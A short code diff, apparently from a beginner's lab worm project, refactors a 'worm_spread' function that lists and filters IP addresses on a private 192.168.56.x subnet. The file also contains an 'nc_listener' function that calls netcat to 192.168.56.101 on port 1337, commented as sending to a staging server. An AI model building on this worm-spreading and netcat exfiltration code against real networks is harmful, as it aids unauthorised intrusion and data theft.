@@ -13,21 +13,17 @@ def worm_spread():
 
     print(ips)
 
+    unwanted_ips = ["192.168.56.1", "192.168.56.100", "192.168.56.101"]
+
     for i in ips:
-        if i.endswith(".1") == True:
-            break
-        elif i.endswith(".100") == True:
-            break
-        elif i.endswith(".101") == True:
-            break
-        else:
+        if i not in unwanted_ips:
             print(i)
-
+        
 worm_spread()
-
 
 def nc_listener():
     #sending to staging server via netcat
     subprocess.call(["nc", "192.168.56.101", "1337"])
 
 print(nc_listener())
+
